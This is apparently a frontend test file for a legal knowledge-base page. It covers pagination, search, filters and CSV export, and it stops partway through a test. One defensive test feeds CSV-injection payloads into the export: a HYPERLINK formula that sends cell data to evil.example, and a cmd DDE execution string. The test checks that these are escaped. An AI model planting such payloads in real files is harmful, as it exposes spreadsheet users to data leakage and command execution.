// KnowledgeBasePage — accepted-assertion catalog + global search results.
// The api client and session are mocked; all data comes from fixtures.

import { render, screen, waitFor, within } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { afterAll, beforeAll, beforeEach, describe, expect, it, vi } from "vitest";

import type { AssertionList, AssertionListItem, AssertionListParams } from "../../api/types";
import { KnowledgeBasePage } from "../KnowledgeBasePage";

vi.mock("../../api/client", () => ({
  api: {
    listAssertions: vi.fn(),
    ratingSummary: vi.fn(),
  },
}));

// Viewer role on purpose: this page is read-only for every role, so it must
// render fully (and show no review/rating actions) even for a viewer.
const sessionFixture = {
  user: { id: "u1", email: "dana@example.com", display_name: "Dana Levi" },
  currentMatter: {
    id: "m1",
    name: "Acme v. Beta Holdings",
    repository_id: "r1",
    organization_id: "o1",
    role: "viewer" as const,
  },
  role: "viewer" as const,
  matters: [],
};

vi.mock("../../app/session", () => ({
  useActiveSession: () => sessionFixture,
}));

import { api } from "../../api/client";

const mockedApi = api as unknown as {
  listAssertions: ReturnType<typeof vi.fn>;
  ratingSummary: ReturnType<typeof vi.fn>;
};

const a1: AssertionListItem = {
  id: "a1",
  organization_id: "o1",
  repository_id: "r1",
  matter_id: "m1",
  assertion_type: "obligation",
  proposition: "Clause 8.2 requires notice to the supplier within 30 days.",
  proposition_raw: null,
  subject_entity: { type: "clause", id: "c-8.2" },
  object_entity: null,
  origin: "user_suggested",
  status: "accepted",
  standing: "accepted",
  author_user_id: "u2",
  confidence: null,
  jurisdiction: "IL",
  effective_from: null,
  effective_to: null,
  created_at: "2026-07-01T10:00:00Z",
  updated_at: "2026-07-20T10:00:00Z",
  submitted_at: "2026-07-02T10:00:00Z",
  reviewed_by: "u3",
  reviewed_at: "2026-07-03T10:00:00Z",
  superseded_by_assertion_id: null,
  current_revision_number: 3,
  evidence_status: "evidenced",
  // GET /assertions embeds the current revision's rating aggregate.
  ratings_summary: {
    assertion_id: "a1",
    assertion_revision_id: "rev-3",
    count: 12,
    average: 3.8,
    median: 4,
    distribution: { "1": 1, "2": 1, "3": 2, "4": 5, "5": 3 },
  },
  current_user_rating: null,
  last_activity_at: "2026-07-21T10:00:00Z",
};

const a2: AssertionListItem = {
  ...a1,
  id: "a2",
  proposition: "Termination for convenience requires 60 days written notice.",
  origin: "model_suggested",
  author_user_id: "u4",
  confidence: 0.82,
  jurisdiction: null,
  current_revision_number: null,
  evidence_status: "awaiting_evidence",
  ratings_summary: null,
};

/** A stand-in for GET /assertions over `rows`, honouring limit and offset. */
function serve(rows: AssertionListItem[]) {
  return async (_matterId: string, params: AssertionListParams = {}): Promise<AssertionList> => {
    const offset = params.offset ?? 0;
    const end = params.limit === undefined ? rows.length : offset + params.limit;
    return { items: rows.slice(offset, end), total: rows.length, limit: params.limit ?? null, offset };
  };
}

function manyRows(count: number): AssertionListItem[] {
  return Array.from({ length: count }, (_, i) => ({
    ...a1,
    id: `row-${i}`,
    proposition: `Proposition number ${i}.`,
  }));
}

/** Set the hash and let its (asynchronous) hashchange fire before anything
 * renders: in the app a page mounts in response to that event, never before. */
async function setHash(hash: string): Promise<void> {
  const target = hash === "" || hash === "#" ? "" : hash.startsWith("#") ? hash : `#${hash}`;
  if (window.location.hash === target) return;
  await new Promise<void>((resolve) => {
    window.addEventListener("hashchange", () => resolve(), { once: true });
    window.location.hash = hash;
  });
}

beforeEach(async () => {
  await setHash("");
  mockedApi.listAssertions.mockReset();
  mockedApi.ratingSummary.mockReset();
  mockedApi.listAssertions.mockImplementation(serve([a1, a2]));
});

describe("KnowledgeBasePage", () => {
  it("loads the first page of accepted assertions by default and renders the table", async () => {
    render(<KnowledgeBasePage />);

    expect(await screen.findByText(a1.proposition)).toBeInTheDocument();
    expect(mockedApi.listAssertions).toHaveBeenCalledWith("m1", {
      status: "accepted",
      sort: "-created_at",
      limit: 50,
      offset: 0,
    });

    // Matter name in the subtitle; propositions link to the detail page.
    expect(screen.getByText(/Acme v\. Beta Holdings/)).toBeInTheDocument();
    expect(screen.getByRole("link", { name: a1.proposition })).toHaveAttribute(
      "href",
      "#/assertions/a1",
    );

    // Origin chips, evidence status, and model confidence stay separate
    // signals. Scoped to the table: the filter selects reuse these labels.
    const table = within(screen.getByRole("table"));
    expect(table.getByText("Colleague")).toBeInTheDocument();
    expect(table.getByText("AI-deduced")).toBeInTheDocument();
    expect(table.getByText("Evidenced")).toBeInTheDocument();
    expect(table.getByText("Awaiting evidence")).toBeInTheDocument();
    expect(table.getByText(/82% model confidence/)).toBeInTheDocument();

    expect(screen.getByText("Showing 1–2 of 2 assertions")).toBeInTheDocument();
    // One page holds everything: no pager.
    expect(screen.queryByRole("button", { name: "Next" })).not.toBeInTheDocument();

    // Read-only page: no review or rating actions for any role (viewer here).
    expect(
      screen.queryByRole("button", { name: /accept|reject|dispute|revision|rate/i }),
    ).not.toBeInTheDocument();
  });

  it("labels pipeline output without evidence as system-derived, not awaiting evidence", async () => {
    // ui:4: the definition-linking pipeline writes accepted assertions with no
    // evidence rows; nothing is pending for them.
    const pipeline: AssertionListItem = {
      ...a2,
      id: "a3",
      proposition: "Section 4 uses the defined term 'Supplier'.",
      origin: "system_generated",
    };
    mockedApi.listAssertions.mockImplementation(serve([pipeline, a2]));
    render(<KnowledgeBasePage />);

    const row = (await screen.findByText(pipeline.proposition)).closest("tr") as HTMLElement;
    expect(within(row).getByText("System-derived")).toBeInTheDocument();
    expect(within(row).queryByText("Awaiting evidence")).not.toBeInTheDocument();
    // A colleague's or model's assertion without evidence still awaits it.
    const other = screen.getByText(a2.proposition).closest("tr") as HTMLElement;
    expect(within(other).getByText("Awaiting evidence")).toBeInTheDocument();
  });

  it("renders the rating summary embedded in each row, with no request per row", async () => {
    render(<KnowledgeBasePage />);

    expect(await screen.findByText("avg 3.8 · 12 ratings")).toBeInTheDocument();
    // ui:1: one rating-summary request per row exhausted the browser at
    // matter scale (2,036 rows: 680 failed requests, every cell "—").
    expect(mockedApi.ratingSummary).not.toHaveBeenCalled();
    expect(mockedApi.listAssertions).toHaveBeenCalledTimes(1);

    // a2 has no rating aggregate (unrated, or no revision row).
    const row2 = screen.getByText(a2.proposition).closest("tr");
    expect(row2).not.toBeNull();
    expect(within(row2 as HTMLElement).getByText("—")).toBeInTheDocument();

    // Legend keeps ratings distinct from review status and confidence.
    expect(
      screen.getByText(/independent of review status and model confidence/i),
    ).toBeInTheDocument();
  });

  it("shows at most one page of a large matter, from one request", async () => {
    // A definition-link run writes tens of thousands of accepted assertions.
    mockedApi.listAssertions.mockImplementation(serve(manyRows(20_000)));
    render(<KnowledgeBasePage />);

    await screen.findByText("Proposition number 0.");
    const table = within(screen.getByRole("table"));
    expect(table.getAllByRole("row")).toHaveLength(51); // header + 50
    expect(screen.getByText("Showing 1–50 of 20,000 assertions")).toBeInTheDocument();
    expect(screen.getByText("Page 1 of 400")).toBeInTheDocument();
    expect(mockedApi.listAssertions).toHaveBeenCalledTimes(1);
    expect(mockedApi.ratingSummary).not.toHaveBeenCalled();
  });

  it("pages with Previous and Next", async () => {
    mockedApi.listAssertions.mockImplementation(serve(manyRows(120)));
    const user = userEvent.setup();
    render(<KnowledgeBasePage />);

    await screen.findByText("Proposition number 0.");
    expect(screen.getByText("Showing 1–50 of 120 assertions")).toBeInTheDocument();
    expect(screen.getByRole("button", { name: "Previous" })).toBeDisabled();

    await user.click(screen.getByRole("button", { name: "Next" }));
    expect(await screen.findByText("Proposition number 50.")).toBeInTheDocument();
    expect(mockedApi.listAssertions).toHaveBeenLastCalledWith("m1", {
      status: "accepted",
      sort: "-created_at",
      limit: 50,
      offset: 50,
    });
    expect(screen.queryByText("Proposition number 0.")).not.toBeInTheDocument();
    expect(screen.getByText("Showing 51–100 of 120 assertions")).toBeInTheDocument();

    await user.click(screen.getByRole("button", { name: "Next" }));
    expect(await screen.findByText("Proposition number 119.")).toBeInTheDocument();
    expect(screen.getByText("Showing 101–120 of 120 assertions")).toBeInTheDocument();
    expect(screen.getByText("Page 3 of 3")).toBeInTheDocument();
    expect(screen.getByRole("button", { name: "Next" })).toBeDisabled();

    await user.click(screen.getByRole("button", { name: "Previous" }));
    expect(await screen.findByText("Proposition number 50.")).toBeInTheDocument();
    expect(mockedApi.listAssertions).toHaveBeenLastCalledWith(
      "m1",
      expect.objectContaining({ offset: 50 }),
    );
  });

  it("returns to the first page whenever the search, a filter or the sort changes", async () => {
    mockedApi.listAssertions.mockImplementation(serve(manyRows(120)));
    const user = userEvent.setup();
    render(<KnowledgeBasePage />);
    await screen.findByText("Proposition number 0.");

    const toPage2 = async () => {
      await user.click(screen.getByRole("button", { name: "Next" }));
      await screen.findByText("Proposition number 50.");
    };
    const lastOffset = () => mockedApi.listAssertions.mock.lastCall?.[1].offset;

    await toPage2();
    await user.selectOptions(screen.getByLabelText("Status"), "");
    await waitFor(() =>
      expect(mockedApi.listAssertions).toHaveBeenLastCalledWith("m1", {
        sort: "-created_at",
        limit: 50,
        offset: 0,
      }),
    );
    await screen.findByText("Proposition number 0.");

    await toPage2();
    await user.selectOptions(screen.getByLabelText("Origin"), "model_suggested");
    await waitFor(() => expect(lastOffset()).toBe(0));
    await screen.findByText("Proposition number 0.");

    await toPage2();
    await user.selectOptions(screen.getByLabelText("Sort"), "proposition");
    await waitFor(() => expect(lastOffset()).toBe(0));
    await screen.findByText("Proposition number 0.");

    await toPage2();
    await user.type(screen.getByLabelText("Search assertions"), "number");
    await waitFor(() =>
      expect(mockedApi.listAssertions).toHaveBeenLastCalledWith(
        "m1",
        expect.objectContaining({ q: "number", offset: 0 }),
      ),
    );
    // Every request stayed one bounded page.
    for (const [, params] of mockedApi.listAssertions.mock.calls) {
      expect(params.limit).toBe(50);
    }
  });

  it("starts at the first page when a filter returns to an earlier value", async () => {
    mockedApi.listAssertions.mockImplementation(serve(manyRows(120)));
    const user = userEvent.setup();
    render(<KnowledgeBasePage />);
    await screen.findByText("Proposition number 0.");
    await user.click(screen.getByRole("button", { name: "Next" }));
    await screen.findByText("Proposition number 50.");

    await user.selectOptions(screen.getByLabelText("Origin"), "model_suggested");
    await screen.findByText("Proposition number 0.");
    await user.selectOptions(screen.getByLabelText("Origin"), "");

    await waitFor(() =>
      expect(mockedApi.listAssertions).toHaveBeenLastCalledWith("m1", {
        status: "accepted",
        sort: "-created_at",
        limit: 50,
        offset: 0,
      }),
    );
    expect(screen.getByText("Showing 1–50 of 120 assertions")).toBeInTheDocument();
  });

  it("steps back to the last page when rows disappear from under it", async () => {
    let rows = manyRows(120);
    mockedApi.listAssertions.mockImplementation((m: string, p: AssertionListParams) =>
      serve(rows)(m, p),
    );
    const user = userEvent.setup();
    render(<KnowledgeBasePage />);
    await screen.findByText("Proposition number 0.");
    await user.click(screen.getByRole("button", { name: "Next" }));
    await screen.findByText("Proposition number 50.");

    // 30 rows leave the result set (reviewed elsewhere) before Next: page 3
    // no longer exists, so the page shows the last one that does.
    rows = manyRows(90);
    await user.click(screen.getByRole("button", { name: "Next" }));
    await waitFor(() =>
      expect(screen.getByText("Showing 51–90 of 90 assertions")).toBeInTheDocument(),
    );
    expect(screen.getByText("Proposition number 89.")).toBeInTheDocument();
    const offsets = mockedApi.listAssertions.mock.calls.map(([, params]) => params.offset);
    expect(offsets).toEqual([0, 50, 100, 50]);
    expect(screen.queryByText("No assertions found")).not.toBeInTheDocument();
  });

  it("refetches when status, origin, or sort change", async () => {
    const user = userEvent.setup();
    render(<KnowledgeBasePage />);
    await screen.findByText(a1.proposition);

    await user.selectOptions(screen.getByLabelText("Status"), "");
    await waitFor(() =>
      expect(mockedApi.listAssertions).toHaveBeenLastCalledWith("m1", {
        sort: "-created_at",
        limit: 50,
        offset: 0,
      }),
    );

    await user.selectOptions(screen.getByLabelText("Origin"), "model_suggested");
    await waitFor(() =>
      expect(mockedApi.listAssertions).toHaveBeenLastCalledWith("m1", {
        origin: "model_suggested",
        sort: "-created_at",
        limit: 50,
        offset: 0,
      }),
    );

    await user.selectOptions(screen.getByLabelText("Sort"), "proposition");
    await waitFor(() =>
      expect(mockedApi.listAssertions).toHaveBeenLastCalledWith("m1", {
        origin: "model_suggested",
        sort: "proposition",
        limit: 50,
        offset: 0,
      }),
    );
  });

  it("sorts by ratings on the server and says that order is user opinion", async () => {
    const user = userEvent.setup();
    render(<KnowledgeBasePage />);
    await screen.findByText(a1.proposition);
    expect(screen.queryByText(/user opinion/)).not.toBeInTheDocument();

    await user.selectOptions(screen.getByLabelText("Sort"), "-average_rating");
    await waitFor(() =>
      expect(mockedApi.listAssertions).toHaveBeenLastCalledWith(
        "m1",
        expect.objectContaining({ sort: "-average_rating", offset: 0 }),
      ),
    );
    // Spec §17: sorting by rating reflects user opinion, not legal authority.
    expect(screen.getByText(/user opinion, not legal authority/)).toBeInTheDocument();

    await user.selectOptions(screen.getByLabelText("Sort"), "-rating_count");
    await waitFor(() =>
      expect(mockedApi.listAssertions).toHaveBeenLastCalledWith(
        "m1",
        expect.objectContaining({ sort: "-rating_count" }),
      ),
    );
    expect(screen.getByText(/user opinion, not legal authority/)).toBeInTheDocument();
  });

  it("searches with a debounced q param", async () => {
    const user = userEvent.setup();
    render(<KnowledgeBasePage />);
    await screen.findByText(a1.proposition);

    await user.type(screen.getByLabelText("Search assertions"), "notice");

    await waitFor(() =>
      expect(mockedApi.listAssertions).toHaveBeenLastCalledWith(
        "m1",
        expect.objectContaining({ q: "notice" }),
      ),
    );
  });

  it("reads ?q= from the hash as a search across every status", async () => {
    // ?q= is the topbar's global search (ui:22): it must find assertions in
    // any status the viewer can see, not only the accepted catalog.
    await setHash("#/knowledge?q=capacity");
    const view = render(<KnowledgeBasePage />);

    await screen.findByText(a1.proposition);
    expect(mockedApi.listAssertions).toHaveBeenCalledWith("m1", {
      q: "capacity",
      sort: "-created_at",
      limit: 50,
      offset: 0,
    });
    // One request: the search does not first load the accepted catalog.
    expect(mockedApi.listAssertions).toHaveBeenCalledTimes(1);
    expect(screen.getByLabelText("Status")).toHaveValue("");
    expect(screen.getByText(/Results for/)).toHaveTextContent(
      "Results for “capacity” across all statuses",
    );
    expect(screen.getByText("“capacity”")).toBeInTheDocument();
    expect(screen.getByLabelText("Search assertions")).toHaveValue("capacity");

    // The line says what is searched when a status filter narrows it.
    const user = userEvent.setup();
    await user.selectOptions(screen.getByLabelText("Status"), "accepted");
    expect(screen.getByText(/Results for/)).toHaveTextContent(
      "Results for “capacity” in Accepted",
    );

    view.unmount();
    await setHash("");
  });

  it("offers every review status in the Status filter", async () => {
    const user = userEvent.setup();
    render(<KnowledgeBasePage />);
    await screen.findByText(a1.proposition);

    const options = within(screen.getByLabelText("Status"))
      .getAllByRole("option")
      .map((option) => (option as HTMLOptionElement).value);
    expect([...options].sort()).toEqual(
      [
        "",
        "accepted",
        "disputed",
        "draft",
        "proposed",
        "rejected",
        "revision_requested",
        "superseded",
        "withdrawn",
      ].sort(),
    );

    await user.selectOptions(screen.getByLabelText("Status"), "revision_requested");
    await waitFor(() =>
      expect(mockedApi.listAssertions).toHaveBeenLastCalledWith("m1", {
        status: "revision_requested",
        sort: "-created_at",
        limit: 50,
        offset: 0,
      }),
    );
  });

  it("shows an empty state when nothing matches", async () => {
    mockedApi.listAssertions.mockImplementation(serve([]));
    render(<KnowledgeBasePage />);

    expect(await screen.findByText("No assertions found")).toBeInTheDocument();
    expect(screen.queryByRole("table")).not.toBeInTheDocument();
    expect(screen.getByRole("button", { name: "Export CSV" })).toBeDisabled();
  });

  it("shows an error banner and retries on demand", async () => {
    mockedApi.listAssertions
      .mockRejectedValueOnce(new Error("Matter unavailable"))
      .mockResolvedValueOnce({ items: [a1], total: 1 });
    const user = userEvent.setup();
    render(<KnowledgeBasePage />);

    expect(await screen.findByRole("alert")).toHaveTextContent("Matter unavailable");

    await user.click(screen.getByRole("button", { name: "Retry" }));
    expect(await screen.findByText(a1.proposition)).toBeInTheDocument();
    expect(mockedApi.listAssertions).toHaveBeenCalledTimes(2);
  });

  it("exports every match as CSV, paging through the list 500 rows at a time", async () => {
    // More than one export page, and more than the 50 rows on screen.
    const rows = [...manyRows(1_202), a2];
    mockedApi.listAssertions.mockImplementation(serve(rows));

    const { text, revokeObjectURL } = await exportCsv("Proposition number 0.");

    const lines = text.split("\r\n");
    expect(lines[0]).toBe(
      "Proposition,Type,Jurisdiction,Origin,Status,Standing,Evidence,Avg rating,Ratings,Updated",
    );
    expect(lines).toHaveLength(1 + rows.length);
    expect(lines[1]).toBe(
      "Proposition number 0.,obligation,IL,Colleague,accepted,accepted,evidenced,3.80,12,2026-07-20T10:00:00.000Z",
    );
    expect(text).toContain("\r\nProposition number 1201.,");
    // A row without a rating aggregate: no average, zero ratings.
    expect(lines[lines.length - 1]).toBe(
      `${a2.proposition},obligation,,AI-deduced,accepted,accepted,awaiting_evidence,,0,2026-07-20T10:00:00.000Z`,
    );
    // The export used the page's filters and sort, 500 rows per request. It
    // holds back the last 20 rows of a full page, and the next request starts
    // 20 rows before those, so it reads again the last 20 rows written and
    // the 20 held back: that is how it finds its place even if rows joined or
    // left meanwhile (listing:1).
    const exportCalls = mockedApi.listAssertions.mock.calls
      .map(([, params]) => params as AssertionListParams)
      .filter((params) => params.limit === 500);
    expect(exportCalls).toEqual([
      { status: "accepted", sort: "-created_at", limit: 500, offset: 0 },
      { status: "accepted", sort: "-created_at", limit: 500, offset: 460 },
      { status: "accepted", sort: "-created_at", limit: 500, offset: 920 },
    ]);
    expect(mockedApi.ratingSummary).not.toHaveBeenCalled();
    expect(revokeObjectURL).toHaveBeenCalledWith("blob:lexgraph");
  });

  it("writes UTF-8 with a byte-order mark, so Excel reads Hebrew text correctly", async () => {
    // fe-shell-authoring:4: without the mark Excel decodes a double-clicked
    // CSV in the ANSI code page, and 'חוק' arrives as '×—×•×§'.
    const hebrew = { ...a1, id: "he", proposition: "חוק הגנת הפרטיות חל על מאגר המידע" };
    mockedApi.listAssertions.mockImplementation(serve([hebrew]));

    const { text, bytes } = await exportCsv(hebrew.proposition);

    expect([...bytes.slice(0, 3)]).toEqual([0xef, 0xbb, 0xbf]);
    // The mark is not part of the first cell: the header is unchanged and
    // carries no formula-guard apostrophe.
    expect(new TextDecoder("utf-8", { ignoreBOM: true }).decode(bytes)).toMatch(/^\uFEFFProposition,Type,/);
    expect(text.split("\r\n")[0]).toBe(
      "Proposition,Type,Jurisdiction,Origin,Status,Standing,Evidence,Avg rating,Ratings,Updated",
    );
    expect(text.split("\r\n")[1]).toMatch(/^חוק הגנת הפרטיות חל על מאגר המידע,obligation,/);
  });

  it("shows export progress and can cancel it", async () => {
    let releaseSecondPage: () => void = () => {};
    const rows = manyRows(700);
    mockedApi.listAssertions.mockImplementation(
      async (m: string, params: AssertionListParams = {}) => {
        if (params.limit === 500 && (params.offset ?? 0) > 0) {
          await new Promise<void>((resolve) => {
            releaseSecondPage = resolve;
          });
        }
        return serve(rows)(m, params);
      },
    );
    const createObjectURL = vi.fn((_blob: Blob) => "blob:lexgraph");
    Object.assign(URL, { createObjectURL, revokeObjectURL: vi.fn() });
    const user = userEvent.setup();
    render(<KnowledgeBasePage />);
    await screen.findByText("Proposition number 0.");

    await user.click(screen.getByRole("button", { name: "Export CSV" }));
    expect(await screen.findByRole("status")).toHaveTextContent("Exporting 500 of 700");
    expect(screen.getByRole("button", { name: "Export CSV" })).toBeDisabled();

    await user.click(screen.getByRole("button", { name: "Cancel export" }));
    releaseSecondPage();
    await waitFor(() =>
      expect(screen.getByRole("button", { name: "Export CSV" })).toBeEnabled(),
    );
    expect(screen.queryByRole("status")).not.toBeInTheDocument();
    expect(createObjectURL).not.toHaveBeenCalled();
  });

  it("reports a failed export instead of downloading part of it", async () => {
    const rows = manyRows(700);
    mockedApi.listAssertions.mockImplementation(
      async (m: string, params: AssertionListParams = {}) => {
        if (params.limit === 500 && (params.offset ?? 0) > 0) throw new Error("Server went away");
        return serve(rows)(m, params);
      },
    );
    const createObjectURL = vi.fn((_blob: Blob) => "blob:lexgraph");
    Object.assign(URL, { createObjectURL, revokeObjectURL: vi.fn() });
    const user = userEvent.setup();
    render(<KnowledgeBasePage />);
    await screen.findByText("Proposition number 0.");

    await user.click(screen.getByRole("button", { name: "Export CSV" }));

    expect(await screen.findByRole("alert")).toHaveTextContent(
      "CSV export failed: Server went away",
    );
    expect(createObjectURL).not.toHaveBeenCalled();
    expect(screen.getByRole("button", { name: "Export CSV" })).toBeEnabled();
  });

  it("neutralizes cells a spreadsheet would evaluate as formulas (CSV injection)", async () => {
    // Contributors write propositions freely (the API accepts all of these),
    // so an exported cell must never start with a formula trigger.
    const propositions = [
      '=HYPERLINK("http://evil.example/?x="&A2,"click me")',
      "+1+cmd|' /C calc'!A0",
      "-2+3",
      "@SUM(1,2)",
      "\tleading tab",
      "\rleading carriage return",
      " =1+1",
    ];
    mockedApi.listAssertions.mockImplementation(
      serve([...propositions.map((proposition, i) => ({ ...a1, id: `f${i}`, proposition })), a2]),
    );
    const { text } = await exportCsv(a2.proposition);

    expect(text).toContain(`\r\n"'=HYPERLINK(""http://evil.example/?x=""&A2,""click me"")",`);
    expect(text).toContain("\r\n'+1+cmd|' /C calc'!A0,");
    expect(text).toContain("\r\n'-2+3,");
    expect(text).toContain(`\r\n"'@SUM(1,2)",`);
    expect(text).toContain("\r\n'\tleading tab,");
    expect(text).toContain(`\r\n"'\rleading carriage return",`);
    expect(text).toContain("\r\n' =1+1,");
    // Ordinary text is exported unchanged.
    expect(text).toContain(`\r\n${a2.proposition},`);
    for (const line of text.split("\r\n").slice(1)) {
      expect(line).not.toMatch(/^"?[=+\-@\t]/);
    }
  });
});

describe("KnowledgeBasePage in Asia/Tokyo", () => {
  // ui:3: an offset-less timestamp is UTC. Read as local time it showed
  // the UTC date and time as the viewer's (here a day early).
  beforeAll(() => {
    vi.stubEnv("TZ", "Asia/Tokyo");
  });
  afterAll(() => {
    vi.unstubAllEnvs();
  });

  it("shows the viewer's local date for an offset-less instant and exports it as UTC", async () => {
    mockedApi.listAssertions.mockImplementation(
      serve([{ ...a1, updated_at: "2026-11-15T20:16:17.835814" }]),
    );
    const { text } = await exportCsv(a1.proposition);

    const row = screen.getByText(a1.proposition).closest("tr");
    expect(row).not.toBeNull();
    // 20:16 UTC on Nov 15 is 05:16 on Nov 16 in Tokyo.
    expect(within(row as HTMLElement).getByText("Nov 16, 2026")).toBeInTheDocument();
    expect(text.split("\r\n")[1]).toMatch(/,2026-11-15T20:16:17\.835Z$/);
  });
});

/** Render, wait for `readyText`, optionally pick a sort (then wait for
 * `sorted.readyText`), click Export CSV and return the downloaded file: its
 * text (decoded as UTF-8, which drops a byte-order mark) and its bytes. */
async function exportCsv(readyText: string, sorted?: { sort: string; readyText: string }) {
  const user = userEvent.setup();
  const createObjectURL = vi.fn((_blob: Blob) => "blob:lexgraph");
  const revokeObjectURL = vi.fn();
  Object.assign(URL, { createObjectURL, revokeObjectURL });
  const click = vi.spyOn(HTMLAnchorElement.prototype, "click").mockImplementation(() => {});
  try {
    render(<KnowledgeBasePage />);
    await screen.findByText(readyText);
    if (sorted !== undefined) {
      await user.selectOptions(screen.getByLabelText("Sort"), sorted.sort);
      await screen.findByText(sorted.readyText);
    }
    await user.click(screen.getByRole("button", { name: "Export CSV" }));
    await waitFor(() => expect(click).toHaveBeenCalledTimes(1));
    expect(createObjectURL).toHaveBeenCalledTimes(1);
    const blob = createObjectURL.mock.calls[0][0];
    // jsdom's Blob has no .text(); go through FileReader instead.
    const read = <T,>(how: "readAsText" | "readAsArrayBuffer") =>
      new Promise<T>((resolve, reject) => {
        const reader = new FileReader();
        reader.onload = () => resolve(reader.result as T);
        reader.onerror = () => reject(reader.error);
        reader[how](blob);
      });
    const text = await read<string>("readAsText");
    const bytes = new Uint8Array(await read<ArrayBuffer>("readAsArrayBuffer"));
    return { text, bytes, revokeObjectURL };
  } finally {
    click.mockRestore();
  }
}

// listing:1: the export used to step an OFFSET through the live result set.
// When a row it had already written left the result set (disputed, say), or a
// row it had not read yet moved ahead (a new rating under "Most ratings"),
// the row at the next page boundary was never requested and the file came
// out one row short, with nothing to say so. These tests change the matter
// between the export's requests, like a colleague working meanwhile. Rows
// that match throughout must all be in the file, once, and a row that starts
// matching meanwhile must be in its place in the table's order or left out:
// the first fix wrote such a row after the row it had last written, out of
// order, when that row had left (verifier triggers (a) and (b)).
describe("KnowledgeBasePage CSV export while the matter changes", () => {
  /** Ratings summary with `count` ratings of 4, or null for none. */
  function ratings(id: string, count: number): AssertionListItem["ratings_summary"] {
    if (count === 0) return null;
    return {
      assertion_id: id,
      assertion_revision_id: `rev-${id}`,
      count,
      average: 4,
      median: 4,
      distribution: { "1": 0, "2": 0, "3": 0, "4": count, "5": 0 },
    };
  }

  /** `count` accepted rows in insertion order, each created a minute after
   * the one before; the first `rated` are rated (most ratings first). */
  function matter(count: number, rated = 0): AssertionListItem[] {
    return Array.from({ length: count }, (_, i) => {
      const id = `c-${String(i).padStart(4, "0")}`;
      return {
        ...a1,
        id,
        proposition: `Clause ${String(i).padStart(4, "0")} applies.`,
        created_at: new Date(Date.UTC(2026, 0, 1) + i * 60_000).toISOString(),
        ratings_summary: ratings(id, i < rated ? rated - i : 0),
      };
    });
  }

  /** The server's sort keys the tests use (no sort: insertion order). */
  const SORT_KEYS: Record<string, (a: AssertionListItem, b: AssertionListItem) => number> = {
    "": () => 0,
    "-created_at": (a, b) => b.created_at.localeCompare(a.created_at),
    created_at: (a, b) => a.created_at.localeCompare(b.created_at),
    assertion_type: (a, b) =>
      a.assertion_type < b.assertion_type ? -1 : a.assertion_type > b.assertion_type ? 1 : 0,
    "-rating_count": (a, b) => (b.ratings_summary?.count ?? 0) - (a.ratings_summary?.count ?? 0),
  };

  /** `rows` (in insertion order) as GET /assertions orders them for `sort`:
   * by the sort key, ties in insertion order. */
  function serverOrder(rows: AssertionListItem[], sort: string): AssertionListItem[] {
    const compare = SORT_KEYS[sort];
    if (compare === undefined) throw new Error(`the test server does not sort by ${sort}`);
    const insertion = new Map(rows.map((row, i) => [row.id, i]));
    return [...rows].sort((a, b) => compare(a, b) || insertion.get(a.id)! - insertion.get(b.id)!);
  }

  /** GET /assertions over `rows` (insertion order) as the server answers it:
   * the status filter, the sort with ties in insertion order (no sort:
   * insertion order), then limit/offset. `beforeExportRequest(n, previous)`
   * runs before the n-th export request (limit 500), from the second one on;
   * `previous` is what the export request before it returned. */
  function liveServer(
    rows: AssertionListItem[],
    beforeExportRequest: (n: number, previous: AssertionListItem[]) => void,
  ) {
    let exportRequests = 0;
    let previous: AssertionListItem[] = [];
    return async (_matterId: string, params: AssertionListParams = {}): Promise<AssertionList> => {
      if (params.limit === 500) {
        exportRequests += 1;
        if (exportRequests > 1) beforeExportRequest(exportRequests, previous);
      }
      const matched = serverOrder(rows, params.sort ?? "").filter(
        (row) => !params.status || row.status === params.status,
      );
      const offset = params.offset ?? 0;
      const end = params.limit === undefined ? matched.length : offset + params.limit;
      const items = matched.slice(offset, end);
      if (params.limit === 500) previous = items;
      return { items, total: matched.length, limit: params.limit ?? null, offset };
    };
  }

  /** The offsets of the export's requests (limit 500), in order. */
  function exportOffsets(): (number | undefined)[] {
    return mockedApi.listAssertions.mock.calls
      .map(([, params]) => params as AssertionListParams)
      .filter((params) => params.limit === 500)
      .map((params) => params.offset);
  }

  /** Expect the CSV `text` to hold each row at most once, every row of
   * `throughout`, and its rows in the order the server sorts `rows` by `sort`
   * (positions in that order are immutable in these tests). */
  function expectTableOrder(
    text: string,
    rows: AssertionListItem[],
    sort: string,
    throughout: string[],
  ): string[] {
    const byProposition = new Map(rows.map((row) => [row.proposition, row.id]));
    const ids = propositionsOf(text).map((proposition) => byProposition.get(proposition)!);
    expect(new Set(ids).size).toBe(ids.length);
    expect(ids).toEqual(expect.arrayContaining(throughout));
    const position = new Map(serverOrder(rows, sort).map((row, i) => [row.id, i]));
    const misplaced = ids.findIndex((id, i) => i > 0 && position.get(id)! < position.get(ids[i - 1])!);
    expect(misplaced === -1 ? "in order" : `${ids[misplaced - 1]} before ${ids[misplaced]}`).toBe(
      "in order",
    );
    return ids;
  }

  const pad = (i: number) => String(i).padStart(4, "0");
  const minute = (i: number) => new Date(Date.UTC(2026, 0, 1) + i * 60_000).toISOString();

  /** The propositions of a CSV's data lines (none of these needs quoting). */
  function propositionsOf(text: string): string[] {
    return text.split("\r\n").slice(1).map((line) => line.split(",")[0]);
  }

  function setRow(rows: AssertionListItem[], id: string, change: Partial<AssertionListItem>) {
    const i = rows.findIndex((row) => row.id === id);
    rows[i] = { ...rows[i], ...change };
  }

  it("keeps every match when a row it already wrote is disputed mid-export", async () => {
    const rows = matter(1_100);
    const newestFirst = [...rows].reverse();
    const disputed = newestFirst[0].id; // written by the first request
    mockedApi.listAssertions.mockImplementation(
      liveServer(rows, (n) => {
        if (n === 2) setRow(rows, disputed, { status: "disputed" });
      }),
    );

    const { text } = await exportCsv(newestFirst[0].proposition);

    const exported = propositionsOf(text);
    const throughout = newestFirst.filter((row) => row.id !== disputed).map((row) => row.proposition);
    // Clause 0599 sat right after the first page boundary and used to be lost.
    expect(exported).toContain("Clause 0599 applies.");
    expect(exported.filter((p) => p !== "Clause 1099 applies.")).toEqual(throughout);
    expect(new Set(exported).size).toBe(exported.length);
  });

  it("keeps every match when a removal and an addition leave the total unchanged", async () => {
    const rows = matter(1_100);
    setRow(rows, "c-0100", { status: "proposed" }); // not a match when the export starts
    const disputed = "c-1050"; // written by the first request
    mockedApi.listAssertions.mockImplementation(
      liveServer(rows, (n) => {
        if (n === 2) {
          setRow(rows, disputed, { status: "disputed" });
          setRow(rows, "c-0100", { status: "accepted" }); // after the boundary
        }
      }),
    );

    const { text } = await exportCsv("Clause 1099 applies.");

